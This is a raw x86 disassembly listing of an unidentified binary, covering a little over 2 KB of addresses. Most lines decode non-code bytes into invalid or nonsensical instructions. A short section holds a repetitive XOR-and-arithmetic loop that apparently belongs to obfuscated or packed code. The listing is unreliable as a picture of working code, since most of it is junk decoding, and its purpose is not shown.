  411761:	bound  ebx,QWORD PTR [ecx*8-0x2cc4601e]
  411768:	and    ebp,ebp
  41176a:	retf   0x7187
  41176d:	aaa    
  41176e:	push   edx
  41176f:	test   DWORD PTR [ecx+edx*8],0xe4535f8e
  411776:	mov    esi,0x9931934b
  41177b:	mov    al,ds:0x6949b0ce
  411780:	repnz call 0xf83b:0xa4589fd0
  411788:	sbb    DWORD PTR ds:0x45e915e2,edx
  41178e:	loope  0x411729
  411790:	cmp    bh,dl
  411792:	sahf   
  411793:	or     al,0x8c
  411795:	pop    ss
  411796:	or     BYTE PTR [ecx],dh
  411798:	bnd js 0x411747
  41179b:	jbe    0x411758
  41179d:	pusha  
  41179e:	js     0x411797
  4117a0:	xchg   ecx,eax
  4117a1:	out    0x88,eax
  4117a3:	jno    0x4117bb
  4117a5:	xor    eax,DWORD PTR [eax+0x7f715613]
  4117ab:	leave  
  4117ac:	add    al,BYTE PTR [edx-0x5ad84f39]
  4117b2:	mov    ebx,0x4c8a6635
  4117b7:	or     bl,BYTE PTR ds:0xb4afba77
  4117bd:	adc    al,ch
  4117bf:	sahf   
  4117c0:	sbb    edi,ebp
  4117c2:	shl    BYTE PTR ds:0x5feeefaf,0x59
  4117c9:	mov    bl,ch
  4117cb:	cwde   
  4117cc:	mov    ebp,0x88a5277e
  4117d1:	cmp    al,0x4e
  4117d3:	int    0x9e
  4117d5:	stc    
  4117d6:	rcr    BYTE PTR [eax+0x60],1
  4117d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117da:	int3   
  4117db:	push   ebp
  4117dc:	jns    0x4117fb
  4117de:	cwde   
  4117df:	repz shr ebx,0xa8
  4117e3:	xchg   ecx,eax
  4117e4:	inc    ebx
  4117e5:	add    dl,BYTE PTR [ecx]
  4117e7:	outs   dx,BYTE PTR ds:[esi]
  4117e8:	cmp    BYTE PTR [ebp-0x6e],ch
  4117eb:	jne    0x411811
  4117ed:	fisubr WORD PTR [edi+ebx*8-0x73]
  4117f1:	xor    DWORD PTR fs:[edi-0x66d7ee1d],ebx
  4117f8:	add    BYTE PTR [edx+0x1e],dl
  4117fb:	sub    ah,BYTE PTR [ebx+0x6a]
  4117fe:	or     BYTE PTR [ebx+edi*8],cl
  411801:	push   ecx
  411802:	push   edi
  411803:	je     0x4117ca
  411805:	cmc    
  411806:	int3   
  411807:	add    BYTE PTR [edi+0x408f3f38],0x71
  41180e:	mov    ch,0xd6
  411810:	dec    eax
  411811:	stos   DWORD PTR es:[edi],eax
  411812:	xor    al,0xf4
  411814:	add    DWORD PTR [esi-0x774dad28],eax
  41181a:	push   ss
  41181b:	popf   
  41181c:	jo     0x4117e5
  41181e:	shl    BYTE PTR fs:[eax+ebp*1-0x65b4c76f],cl
  411826:	sub    edi,DWORD PTR [esi-0x747beb15]
  41182c:	dec    ebp
  41182d:	or     eax,0x95b8232d
  411832:	cmp    DWORD PTR [edi-0x23a9187e],ecx
  411838:	les    ecx,FWORD PTR ds:0x7f9a7a48
  41183e:	loop   0x4117ff
  411840:	stc    
  411841:	sbb    BYTE PTR [ecx],al
  411843:	and    DWORD PTR [ecx+0x4b],ebp
  411846:	clc    
  411847:	jb     0x4117d3
  411849:	add    ch,BYTE PTR [ecx+0x6b5b1d1c]
  41184f:	imul   esp
  411851:	lds    ebx,FWORD PTR [esi-0x75]
  411854:	pop    ebp
  411855:	std    
  411856:	ror    esi,0xa9
  411859:	loop   0x411893
  41185b:	xor    al,0x32
  41185d:	mov    esi,0x2d565744
  411862:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411863:	inc    esi
  411864:	xor    al,0xe9
  411866:	imul   esp,DWORD PTR [eax+edx*2+0xc4df5f5],0xccc177d8
  411871:	fs push edi
  411873:	sar    DWORD PTR [esi+0x3e],1
  411876:	sub    al,BYTE PTR [edi+0x28]
  411879:	int3   
  41187a:	fs loopne 0x411864
  41187d:	clc    
  41187e:	xor    ah,ch
  411880:	pop    edx
  411881:	pop    ds
  411882:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411883:	jo     0x4118ad
  411885:	jecxz  0x41182b
  411887:	and    BYTE PTR ds:0xdcd60f4c,cl
  41188d:	dec    ebp
  41188e:	xchg   DWORD PTR [ecx+0x1a077e8b],ecx
  411894:	mov    ds:0xee2546ba,eax
  411899:	jno    0x4118da
  41189b:	adc    BYTE PTR [edi-0x1d],ch
  41189e:	inc    ebp
  41189f:	xchg   ebx,eax
  4118a0:	jo     0x411833
  4118a2:	bound  eax,QWORD PTR [edi]
  4118a4:	cmp    edi,edx
  4118a6:	mov    eax,ds:0x608ddfec
  4118ab:	jne    0x411892
  4118ad:	sahf   
  4118ae:	pop    edi
  4118af:	adc    dl,BYTE PTR [edx+0x7b]
  4118b2:	jne    0x41188d
  4118b4:	xor    ebp,DWORD PTR [edx]
  4118b6:	rcl    BYTE PTR [edx-0x2f460e0b],cl
  4118bc:	ins    BYTE PTR es:[edi],dx
  4118bd:	pop    esi
  4118be:	jmp    0xa275:0xf24ac4b0
  4118c5:	inc    edx
  4118c6:	push   ebx
  4118c7:	and    al,0x28
  4118c9:	idiv   BYTE PTR [esi]
  4118cb:	xchg   edi,eax
  4118cc:	idiv   esp
  4118ce:	pop    ds
  4118cf:	pop    edx
  4118d0:	out    dx,al
  4118d1:	and    eax,0x6555e5d9
  4118d6:	xor    BYTE PTR [edi+0x5d67bd00],al
  4118dc:	pop    edx
  4118dd:	xchg   ecx,eax
  4118de:	loop   0x41186f
  4118e0:	dec    ebx
  4118e1:	add    bl,bl
  4118e3:	or     DWORD PTR [eax+0x10cda25d],ebp
  4118e9:	dec    edx
  4118ea:	adc    al,0xc0
  4118ec:	jecxz  0x411946
  4118ee:	and    cl,BYTE PTR [edx-0x60]
  4118f1:	popa   
  4118f2:	or     esi,DWORD PTR [esi-0x54]
  4118f5:	jae    0x4118cf
  4118f7:	sahf   
  4118f8:	in     al,0x24
  4118fa:	sub    al,0x3c
  4118fc:	sbb    esi,DWORD PTR [ecx]
  4118fe:	inc    edi
  4118ff:	or     BYTE PTR [eax],dl
  411901:	dec    esi
  411902:	fcomp  DWORD PTR [edx]
  411904:	push   es
  411905:	xlat   BYTE PTR ds:[ebx]
  411906:	push   0x23
  411908:	adc    esp,DWORD PTR [esi+0x78]
  41190b:	stos   BYTE PTR es:[edi],al
  41190c:	sti    
  41190d:	dec    esi
  41190e:	fbstp  TBYTE PTR [eax+0x4e362e81]
  411914:	xchg   esi,eax
  411915:	(bad)  
  411916:	sub    al,0x23
  411918:	lods   al,BYTE PTR ds:[esi]
  411919:	int    0x55
  41191b:	(bad)  [ecx+0x5f28232e]
  411921:	inc    bp
  411923:	lahf   
  411924:	jb     0x41192c
  411926:	es mov esp,0xedf6ffd5
  41192c:	sub    al,0xfc
  41192e:	sub    eax,0xae5560f2
  411933:	loop   0x4118eb
  411935:	cli    
  411936:	iret   
  411937:	cmp    dl,BYTE PTR [ebp-0x4f]
  41193a:	mov    al,0xdc
  41193c:	arpl   WORD PTR [ebx],dx
  41193e:	shl    BYTE PTR [ebx+0x6fc7be14],1
  411944:	dec    ebp
  411945:	pop    ss
  411946:	cwde   
  411947:	cmc    
  411948:	call   0x8cde0e63
  41194d:	retf   
  41194e:	mov    esi,fs
  411950:	push   eax
  411951:	adc    ebx,esi
  411953:	pop    ds
  411954:	jl     0x4119bf
  411956:	aad    0x3c
  411958:	inc    ch
  41195a:	cdq    
  41195b:	pop    ss
  41195c:	hlt    
  41195d:	mov    edi,0xaf3f8352
  411962:	jle    0x411950
  411964:	dec    ecx
  411965:	fld    TBYTE PTR [eax-0x4f4dadf7]
  41196b:	adc    al,0x57
  41196d:	ss jg  0x411959
  411970:	shl    BYTE PTR [edx],cl
  411972:	lods   al,BYTE PTR ds:[esi]
  411973:	popf   
  411974:	(bad)  [ebx+edx*1-0x78]
  411978:	pop    edx
  411979:	adc    ch,BYTE PTR cs:[eax+0x49]
  41197d:	sub    al,0xd9
  41197f:	lods   al,BYTE PTR ds:[esi]
  411980:	push   es
  411981:	test   al,0xb0
  411983:	js     0x4119ee
  411985:	fcom   st(6)
  411987:	add    eax,0x4d1704a9
  41198c:	cmp    dl,BYTE PTR [ebp-0x3f]
  41198f:	inc    esp
  411990:	iret   
  411991:	scas   eax,DWORD PTR es:[edi]
  411992:	(bad)  
  411993:	sub    al,0x3
  411995:	push   esi
  411996:	mov    edx,0xf9b7d6cc
  41199b:	cmp    eax,0x9c3e47
  4119a0:	adc    cl,bh
  4119a2:	mov    ecx,0x20a46009
  4119a7:	addr16 jle 0x4119ae
  4119aa:	cmp    eax,ebp
  4119ac:	or     DWORD PTR es:[eax+eiz*2+0x4f45ffae],edi
  4119b4:	mov    al,ds:0x38ba5c76
  4119b9:	mov    ebx,0x946564c4
  4119be:	fadd   st,st(1)
  4119c0:	mov    dl,BYTE PTR [ecx+0x5cb07f84]
  4119c6:	jge    0x411a06
  4119c8:	mov    ah,al
  4119ca:	fs xor al,0xa4
  4119cd:	(bad)  
  4119cf:	cmp    edi,eax
  4119d1:	sti    
  4119d2:	bound  ecx,QWORD PTR [eax-0x4]
  4119d5:	imul   edi,DWORD PTR [edx-0x123264a7],0x83f95aa5
  4119df:	int3   
  4119e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119e1:	fmulp  st(4),st
  4119e3:	jge    0x411a38
  4119e5:	and    dl,ah
  4119e7:	push   edi
  4119e8:	bound  ebx,QWORD PTR [edx]
  4119ea:	and    ch,BYTE PTR [eax*1-0x41f9f2cf]
  4119f1:	pop    edi
  4119f2:	xlat   BYTE PTR ds:[ebx]
  4119f3:	rol    DWORD PTR [eax],cl
  4119f5:	mov    ch,0x16
  4119f7:	sbb    ch,al
  4119f9:	push   ebp
  4119fa:	adc    ebx,DWORD PTR [eax+0x6b]
  4119fd:	es stc 
  4119ff:	sbb    DWORD PTR [ecx-0x3f],eax
  411a02:	mov    ah,0xd9
  411a04:	leave  
  411a05:	fdivr  QWORD PTR [ebx]
  411a07:	xchg   edx,eax
  411a08:	fidivr DWORD PTR [ebx-0x106c4f9f]
  411a0e:	jp     0x4119d8
  411a10:	mov    ah,0x7f
  411a12:	pop    ds
  411a13:	nop
  411a14:	bound  eax,QWORD PTR ds:0x458ef1f2
  411a1a:	rol    di,1
  411a1d:	xlat   BYTE PTR ds:[ebx]
  411a1e:	xchg   edx,eax
  411a1f:	ins    BYTE PTR es:[edi],dx
  411a20:	ins    BYTE PTR es:[edi],dx
  411a21:	out    dx,eax
  411a22:	xchg   edx,eax
  411a23:	and    esi,DWORD PTR [esi-0x64]
  411a26:	sbb    bl,BYTE PTR [eax]
  411a28:	cmp    DWORD PTR [edi-0xb685c4e],esi
  411a2e:	clc    
  411a2f:	sub    edx,edi
  411a31:	rol    BYTE PTR [edi+0x29f5c0d5],0xaa
  411a38:	add    DWORD PTR [ecx+0x3068a58b],ecx
  411a3e:	lods   al,BYTE PTR ds:[esi]
  411a3f:	pop    ecx
  411a40:	mov    bh,0xd8
  411a42:	push   cs
  411a43:	push   edi
  411a44:	cwde   
  411a45:	push   ecx
  411a46:	test   al,0xb8
  411a48:	outs   dx,BYTE PTR ds:[esi]
  411a49:	shr    DWORD PTR [ebx],0xca
  411a4c:	out    dx,al
  411a4d:	fs xor dh,ch
  411a50:	push   esp
  411a51:	mov    ebx,0x44315a70
  411a56:	fsub   st(2),st
  411a58:	jns    0x411a25
  411a5a:	sti    
  411a5b:	xor    eax,0x56d7607a
  411a60:	shl    BYTE PTR [edi-0x63fcbac3],1
  411a66:	hlt    
  411a67:	nop
  411a68:	xor    esp,ebp
  411a6a:	jmp    0x411ad3
  411a6c:	adc    ch,BYTE PTR [esi]
  411a6e:	push   0x66c689de
  411a73:	pop    ebp
  411a74:	sub    BYTE PTR [eax],al
  411a76:	hlt    
  411a77:	cmp    eax,DWORD PTR [ebx+0x4b]
  411a7a:	xchg   ebx,eax
  411a7b:	repnz or dh,dh
  411a7e:	retf   0x286f
  411a81:	lods   eax,DWORD PTR ds:[esi]
  411a82:	dec    edi
  411a83:	js     0x411aff
  411a85:	pop    ebp
  411a86:	fisubr DWORD PTR [edi+0x51]
  411a89:	pop    esp
  411a8a:	test   BYTE PTR [ecx],dh
  411a8c:	fldenv [esi+ebp*8-0x79]
  411a90:	sub    DWORD PTR [edx-0x25],eax
  411a93:	xor    eax,0x62572652
  411a98:	jge    0x411b08
  411a9a:	test   al,0xb8
  411a9c:	test   al,0xe2
  411a9e:	fidiv  WORD PTR [eax+0x46497a91]
  411aa4:	lock cld 
  411aa6:	and    ecx,DWORD PTR [esi]
  411aa8:	or     ch,BYTE PTR ds:0x33e8558b
  411aae:	rol    BYTE PTR [ebx],1
  411ab0:	(bad)  
  411ab1:	cmp    ecx,edx
  411ab3:	mov    ecx,DWORD PTR [ebp-0x14]
  411ab6:	mov    DWORD PTR [ebp+0x8],ecx
  411ab9:	mov    ecx,DWORD PTR [ebp+0x8]
  411abc:	je     0x4164f7
  411ac2:	xor    ecx,eax
  411ac4:	add    ecx,esi
  411ac6:	mov    ecx,0x242ebe9
  411acb:	je     0x411bdb
  411ad1:	mov    edx,DWORD PTR [ebp+0x8]
  411ad4:	mov    ebx,DWORD PTR [ebp-0x8]
  411ad7:	xor    edx,eax
  411ad9:	xor    ebx,eax
  411adb:	sub    edx,ebx
  411add:	sub    edx,esi
  411adf:	xor    edx,eax
  411ae1:	mov    DWORD PTR [ebp+0x8],edx
  411ae4:	mov    edx,DWORD PTR [ebp+0x8]
  411ae7:	mov    ebx,DWORD PTR [ebp-0x58]
  411aea:	add    edx,0x5708c4
  411af0:	imul   edx,ebx
  411af3:	mov    DWORD PTR [ebp-0x58],edx
  411af6:	mov    edx,DWORD PTR [ebp+0x8]
  411af9:	mov    ebx,DWORD PTR [ebp-0x54]
  411afc:	add    edx,0x64f8da
  411b02:	or     edx,ebx
  411b04:	mov    DWORD PTR [ebp-0x54],edx
  411b07:	mov    edx,DWORD PTR [ebp+0x8]
  411b0a:	mov    ebx,DWORD PTR [ebp-0x50]
  411b0d:	add    edx,ecx
  411b0f:	xor    edx,ebx
  411b11:	mov    DWORD PTR [ebp-0x50],edx
  411b14:	mov    edx,DWORD PTR [ebp+0x8]
  411b17:	mov    ebx,DWORD PTR [ebp-0x4c]
  411b1a:	add    edx,edi
  411b1c:	and    edx,ebx
  411b1e:	mov    DWORD PTR [ebp-0x4c],edx
  411b21:	mov    edx,DWORD PTR [ebp+0x8]
  411b24:	mov    ebx,DWORD PTR [ebp-0x48]
  411b27:	lea    edx,[ebx+edx*1+0x241fc1f]
  411b2e:	mov    DWORD PTR [ebp-0x48],edx
  411b31:	mov    edx,DWORD PTR [ebp+0x8]
  411b34:	mov    ebx,0xfa5e15e2
  411b39:	sub    ebx,edx
  411b3b:	add    ebx,DWORD PTR [ebp-0x44]
  411b3e:	mov    DWORD PTR [ebp-0x44],ebx
  411b41:	mov    edx,DWORD PTR [ebp+0x8]
  411b44:	xor    edx,eax
  411b46:	add    edx,esi
  411b48:	jne    0x411ad1
  411b4e:	jmp    0x411bdb
  411b53:	mov    edx,DWORD PTR [ebp-0x14]
  411b56:	mov    DWORD PTR [ebp+0x8],edx
  411b59:	jmp    0x411bce
  411b5e:	mov    edx,DWORD PTR [ebp+0x8]
  411b61:	mov    ebx,DWORD PTR [ebp-0x8]
  411b64:	xor    edx,eax
  411b66:	xor    ebx,eax
  411b68:	sub    edx,ebx
  411b6a:	sub    edx,esi
  411b6c:	xor    edx,eax
  411b6e:	mov    DWORD PTR [ebp+0x8],edx
  411b71:	mov    edx,DWORD PTR [ebp+0x8]
  411b74:	mov    ebx,DWORD PTR [ebp-0x58]
  411b77:	add    edx,0x5708c4
  411b7d:	imul   edx,ebx
  411b80:	mov    DWORD PTR [ebp-0x58],edx
  411b83:	mov    edx,DWORD PTR [ebp+0x8]
  411b86:	mov    ebx,DWORD PTR [ebp-0x54]
  411b89:	add    edx,0x64f8da
  411b8f:	or     edx,ebx
  411b91:	mov    DWORD PTR [ebp-0x54],edx
  411b94:	mov    edx,DWORD PTR [ebp+0x8]
  411b97:	mov    ebx,DWORD PTR [ebp-0x50]
  411b9a:	add    edx,ecx
  411b9c:	xor    edx,ebx
  411b9e:	mov    DWORD PTR [ebp-0x50],edx
  411ba1:	mov    edx,DWORD PTR [ebp+0x8]
  411ba4:	mov    ebx,DWORD PTR [ebp-0x4c]
  411ba7:	add    edx,edi
  411ba9:	and    edx,ebx
  411bab:	mov    DWORD PTR [ebp-0x4c],edx
  411bae:	mov    edx,DWORD PTR [ebp+0x8]
  411bb1:	mov    ebx,DWORD PTR [ebp-0x48]
  411bb4:	lea    edx,[ebx+edx*1+0x241fc1f]
  411bbb:	mov    DWORD PTR [ebp-0x48],edx
  411bbe:	mov    edx,DWORD PTR [ebp+0x8]
  411bc1:	mov    ebx,0xfa5e15e2
  411bc6:	sub    ebx,edx
  411bc8:	add    ebx,DWORD PTR [ebp-0x44]
  411bcb:	mov    DWORD PTR [ebp-0x44],ebx
  411bce:	mov    edx,DWORD PTR [ebp+0x8]
  411bd1:	xor    edx,eax
  411bd3:	add    edx,esi
  411bd5:	jne    0x411b5e
  411bdb:	mov    edx,DWORD PTR [ebp-0x14]
  411bde:	mov    DWORD PTR [ebp+0x8],edx
  411be1:	jmp    0x4163be
  411be6:	jmp    0x413f9a
  411beb:	rcr    BYTE PTR [ecx-0x6f],1
  411bee:	and    BYTE PTR [ecx+0x70],dh
  411bf1:	ror    DWORD PTR [ecx+0x1e6f5998],1
  411bf7:	hlt    
  411bf8:	mov    eax,ds:0xa94b7b0e
  411bfd:	jl     0x411c7b
  411bff:	jmp    0x411c60
  411c01:	jl     0x411c7f
  411c03:	sbb    al,0x1d
  411c05:	mov    ds:0xd0fa86bf,eax
  411c0a:	and    eax,0xada6dd5a
  411c0f:	cmc    
  411c10:	mov    al,0xef
  411c12:	adc    DWORD PTR [edx+ebx*8],esp
  411c15:	xor    esp,DWORD PTR [ebx+0x4ec469b4]
  411c1b:	sbb    al,0x81
  411c1d:	add    ecx,0xffffffeb
  411c20:	icebp  
  411c21:	imul   ebx,DWORD PTR ds:0x76a2fc1a,0x2d
  411c28:	cs jb  0x411c4c
  411c2b:	sbb    esp,0xfffffff1
  411c2e:	xor    bh,BYTE PTR [edx-0x44]
  411c31:	(bad)  
  411c33:	shl    BYTE PTR [eax-0x3a],0x43
  411c37:	scas   al,BYTE PTR es:[edi]
  411c38:	test   eax,0x6b6e6606
  411c3d:	sbb    BYTE PTR [ecx],dh
  411c3f:	mov    dl,0xca
  411c41:	call   0x4575:0x71dfdeff
  411c48:	push   esp
  411c49:	push   cs
  411c4a:	mov    ecx,0xc59ac348
  411c4f:	ret    
  411c50:	je     0x411cca
  411c52:	xlat   BYTE PTR ds:[ebx]
  411c53:	inc    eax
  411c54:	das    
  411c55:	inc    edx
  411c56:	or     DWORD PTR [edi+0x2461e028],edx
  411c5c:	jns    0x411be8
  411c5e:	or     al,0x9f
  411c60:	sub    esp,DWORD PTR [ecx+0x4081ba82]
  411c66:	sbb    dl,BYTE PTR [ecx]
  411c68:	xchg   DWORD PTR [esi-0x5e],ebp
  411c6b:	les    eax,FWORD PTR [edi-0xd1ff76e]
  411c71:	pushf  
  411c72:	ret    0xc00c
  411c75:	nop
  411c76:	daa    
  411c77:	dec    ebp
  411c78:	pop    ecx
  411c79:	add    esp,DWORD PTR [ebp-0x172bbc3c]
  411c7f:	mov    edi,0x118bc6b9
  411c84:	push   cs
  411c85:	xchg   edx,eax
  411c86:	mov    ecx,0xeb840799
  411c8b:	xlat   BYTE PTR ds:[ebx]
  411c8c:	mov    DWORD PTR [ecx-0x476b740f],ebx
  411c92:	inc    ebp
  411c93:	ss ins DWORD PTR es:[edi],dx
  411c95:	shr    cl,0xd4
  411c98:	dec    ecx
  411c99:	and    esp,DWORD PTR [eax]
  411c9b:	aad    0x41
  411c9d:	mov    dh,0xd1
  411c9f:	jne    0x411cc2
  411ca1:	inc    edx
  411ca2:	ret    0xd36d
  411ca5:	mov    DWORD PTR ds:0x230e7c0b,eax
  411cab:	adc    al,0xff
  411cad:	pop    edi
  411cae:	loopne 0x411c8c
  411cb0:	sar    al,cl
  411cb2:	push   ecx
  411cb3:	add    ah,BYTE PTR [ebx+0x62]
  411cb6:	popf   
  411cb7:	xor    ebp,DWORD PTR [esi+0x4daed687]
  411cbd:	mov    esi,0x16eeb0d
  411cc2:	mov    es,ebp
  411cc4:	stc    
  411cc5:	xor    al,0xc6
  411cc7:	(bad)  
  411cc8:	fdiv   DWORD PTR [ebx+0x2c63d963]
  411cce:	(bad)  
  411ccf:	adc    DWORD PTR [eax-0xc],edi
  411cd2:	sub    BYTE PTR [eax+0x718351ac],al
  411cd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cd9:	rol    DWORD PTR [edi-0x1dcc73],1
  411cdf:	add    al,BYTE PTR [edx+ebp*2-0x77]
  411ce3:	push   edi
  411ce4:	mov    WORD PTR [edx-0x1302d37f],es
  411cea:	dec    ebp
  411ceb:	jmp    0x411cf5
  411ced:	jp     0x411d32
  411cef:	stc    
  411cf0:	pop    es
  411cf1:	in     eax,dx
  411cf2:	jbe    0x411cdd
  411cf4:	push   ds
  411cf5:	(bad)  
  411cf6:	imul   ebp,esp,0xffffffc4
  411cf9:	xchg   ch,bl
  411cfb:	mov    BYTE PTR [edi-0xe],ah
  411cfe:	push   ecx
  411cff:	aam    0xaa
  411d01:	hlt    
  411d02:	mov    cl,0x41
  411d04:	pop    eax
  411d05:	cmp    eax,0xffffffbf
  411d08:	pushf  
  411d09:	or     al,BYTE PTR [edi+ebp*8]
  411d0c:	jle    0x411cfc
  411d0e:	data16 adc BYTE PTR [eax+0x334d05d2],dl
  411d15:	add    al,0x5b
  411d17:	ins    BYTE PTR es:[edi],dx
  411d18:	hlt    
  411d19:	enter  0xc0c6,0xe3
  411d1d:	ss sbb ah,bh
  411d20:	xchg   edx,eax
  411d21:	xlat   BYTE PTR ds:[ebx]
  411d22:	imul   ebx,ebx,0xfffffff6
  411d25:	nop
  411d26:	jns    0x411cde
  411d28:	sar    bh,1
  411d2a:	lods   al,BYTE PTR ds:[esi]
  411d2b:	into   
  411d2c:	addr16 jge 0x411dac
  411d2f:	cmc    
  411d30:	fwait
  411d31:	jmp    0x411d33
  411d33:	out    0x87,al
  411d35:	pop    ds
  411d36:	adc    al,0xea
  411d38:	lods   al,BYTE PTR ds:[esi]
  411d39:	dec    esi
  411d3a:	add    al,0xe9
  411d3c:	add    al,0xaa
  411d3e:	ror    DWORD PTR [ecx+edx*2-0x33164b94],1
  411d45:	mov    ds:0x902e1f38,al
  411d4a:	cld    
  411d4b:	pop    es
  411d4c:	xchg   ebp,eax
  411d4d:	adc    eax,DWORD PTR [ebx]
  411d4f:	in     eax,dx
  411d50:	retf   0x8d1b
  411d53:	les    edi,FWORD PTR [esi]
  411d55:	cmc    
  411d56:	push   eax
  411d57:	xchg   BYTE PTR [ebx-0x77bf4457],ah
  411d5d:	lock outs dx,DWORD PTR ds:[esi]
  411d5f:	call   0xc63eba39
  411d64:	xor    al,0x6e
  411d66:	push   ebx
  411d67:	loopne 0x411de7
  411d69:	mov    ds:0xf868aa2b,al
  411d6e:	pop    ebp
  411d6f:	inc    esp
  411d70:	aam    0xb3
  411d72:	xchg   ebp,eax
  411d73:	rcl    DWORD PTR [ebp+ebx*2-0xf],0xe3
  411d78:	cld    
  411d79:	aad    0xae
  411d7b:	in     al,dx
  411d7c:	adc    al,0x51
  411d7e:	rol    DWORD PTR [eax+0x4e],cl
  411d81:	push   esi
  411d82:	and    BYTE PTR [eax-0x16],0x20
  411d86:	push   ds
  411d87:	sbb    al,dh
  411d89:	xchg   esi,eax
  411d8a:	jno    0x411d91
  411d8c:	mov    edi,0xf2f9fadb
  411d91:	and    DWORD PTR [edx],esp
  411d93:	dec    ecx
  411d94:	inc    esi
  411d95:	mov    edi,0x9e25fb61
  411d9a:	mov    edi,0xf6a48fa2
  411d9f:	dec    esi
  411da0:	push   edi
  411da1:	jp     0x411d2f
  411da3:	hlt    
  411da4:	push   0x296c0559
  411da9:	dec    ecx
  411daa:	es repnz icebp 
  411dad:	sbb    dl,dh
  411daf:	jle    0x411df6
  411db1:	sub    DWORD PTR [esi*4-0x54fae1b3],0xdf66ed47
  411dbc:	mov    ecx,0x5570287f
  411dc1:	cmc    
  411dc2:	sub    BYTE PTR [esi+0x45606f24],dh
  411dc8:	sub    DWORD PTR [esi-0x1c],ecx
  411dcb:	mov    WORD PTR [ecx+ebp*2-0x68],gs
  411dcf:	pop    edi
  411dd0:	shl    ecx,0x79
  411dd3:	enter  0x4531,0xc8
  411dd7:	add    al,0x9a
  411dd9:	sbb    edi,DWORD PTR [edi]
  411ddb:	adc    BYTE PTR [esi],ch
  411ddd:	retf   
  411dde:	adc    DWORD PTR [ebx-0x1c9c8b37],ebp
  411de4:	fwait
  411de5:	lock cmp bl,BYTE PTR [ecx-0x38]
  411de9:	fidiv  DWORD PTR [ecx+0xd]
  411dec:	pushf  
  411ded:	std    
  411dee:	jo     0x411d80
  411df0:	mov    edi,0xcb9d9483
  411df5:	mov    WORD PTR ds:0xb371147e,?
  411dfb:	fxch   st(0)
  411dfd:	push   ecx
  411dfe:	(bad)  
  411e00:	addr16 and eax,0x16214260
  411e06:	test   DWORD PTR [ecx-0x1d],ebx
  411e09:	mov    esi,0x4d05653c
  411e0e:	mov    edx,0x6277847b
  411e13:	push   ebp
  411e14:	addr16 dec esp
  411e16:	outs   dx,DWORD PTR ds:[esi]
  411e17:	pop    ds
  411e18:	jp     0x411dc6
  411e1a:	push   0xcf8d3375
  411e1f:	in     al,0x2f
  411e21:	dec    ebx
  411e22:	inc    ecx
  411e23:	cld    
  411e24:	out    dx,eax
  411e25:	add    eax,DWORD PTR [esp+edx*2-0x46b18c9f]
  411e2c:	xchg   DWORD PTR [esi],edx
  411e2e:	jecxz  0x411eab
  411e30:	mov    bl,0x58
  411e32:	fmul   st,st(6)
  411e34:	sub    DWORD PTR [ebx],edi
  411e36:	xor    dh,bl
  411e38:	cmp    DWORD PTR [edx+0x46],ebp
  411e3b:	repz ret 
  411e3d:	iret   
  411e3e:	sub    ah,ch
  411e40:	loopne 0x411de2
  411e42:	ror    bl,1
  411e44:	ds aad 0xdd
  411e47:	sbb    al,0x4b
  411e49:	ss fcmovne st,st(1)
  411e4c:	xchg   esp,eax
  411e4d:	jbe    0x411e73
  411e4f:	push   0xffffffb2
  411e51:	dec    ecx
  411e52:	xchg   ebp,eax
  411e53:	nop
  411e54:	mov    edx,ss
  411e56:	lds    edx,FWORD PTR [ebx]
  411e58:	js     0x411ecf
  411e5a:	in     eax,0xb6
  411e5c:	mov    ds:0xda2b6311,eax
  411e61:	push   0x1b6b16a3
  411e66:	(bad)  
  411e68:	xor    DWORD PTR [edx+0x5e],0x62e4e3b8
  411e6f:	or     al,0xdd
  411e71:	outs   dx,BYTE PTR ds:[esi]
  411e72:	jp     0x411e13
  411e74:	pop    ecx
  411e75:	jle    0x411ea6
  411e77:	jg     0x411e30
  411e79:	sbb    cl,dl
  411e7b:	push   cs
  411e7c:	or     BYTE PTR [edx+ecx*4+0x27],al
  411e80:	pop    es
  411e81:	push   eax
  411e82:	scas   eax,DWORD PTR es:[edi]
  411e83:	out    0xd5,al
  411e85:	mov    ecx,0x8bc72b74
  411e8a:	test   BYTE PTR [edx+esi*2-0x26d99973],al
  411e91:	test   BYTE PTR [esi],0xad
  411e94:	add    cl,bl
  411e96:	lahf   
  411e97:	push   ds
  411e98:	push   ss
  411e99:	dec    edi
  411e9a:	cmp    eax,0xff8637f
  411e9f:	jmp    0x411f1b
  411ea1:	dec    esp
  411ea2:	scas   eax,DWORD PTR es:[edi]
  411ea3:	sbb    bh,ah
  411ea5:	xor    al,0x22
  411ea7:	mov    esi,0x91e1c599
  411eac:	push   edx
  411ead:	test   al,0x38
  411eaf:	xor    al,BYTE PTR ds:0x2bd35267
  411eb5:	add    ch,al
  411eb7:	test   DWORD PTR ds:0xe871b712,ecx
  411ebd:	gs leave 
  411ebf:	fs xchg edi,eax
  411ec1:	push   0x35
  411ec3:	imul   esp,DWORD PTR [esi-0x5cf098b2],0x65986792
  411ecd:	sahf   
  411ece:	inc    esi
  411ecf:	inc    edx
  411ed0:	mov    BYTE PTR [edi+0x57423482],cl
  411ed6:	mov    ebx,DWORD PTR [edi+0x19]
  411ed9:	cmp    esp,DWORD PTR [eax+0x36]
  411edc:	sti    
  411edd:	cmc    
  411ede:	fiadd  WORD PTR [edx+0x4a39a9f2]
  411ee4:	frstor [ebp+0x57]
  411ee7:	fs into 
  411ee9:	stos   DWORD PTR es:[edi],eax
  411eea:	rcr    DWORD PTR [esi],0x4a
  411eed:	(bad)  
  411eee:	push   edx
  411eef:	mov    esi,0xedc16977
  411ef4:	and    BYTE PTR [ebp-0x6c92f861],0xc2
  411efb:	pop    ebp
  411efc:	mov    dh,0xcf
  411efe:	jns    0x411f48
  411f00:	and    al,0x55
  411f02:	inc    ebp
  411f03:	out    0xb6,eax
  411f05:	mov    ds:0x44b021db,eax
  411f0a:	data16 int 0x56
  411f0d:	cmp    ebx,DWORD PTR [ebx+0x3eac3b89]
  411f13:	addr16 xchg ebp,eax
  411f15:	push   ds
  411f16:	call   0xfc68f0bc
  411f1b:	das    
  411f1c:	jle    0x411efb
  411f1e:	and    cl,BYTE PTR [ecx+0x51]
  411f21:	mov    cl,0x5d
  411f23:	jle    0x411f73
  411f25:	xchg   edx,eax
  411f26:	sub    esi,ebp
  411f28:	push   edx
  411f29:	push   0xffffff9b
  411f2b:	mov    ds:0xf6aa2e3c,eax
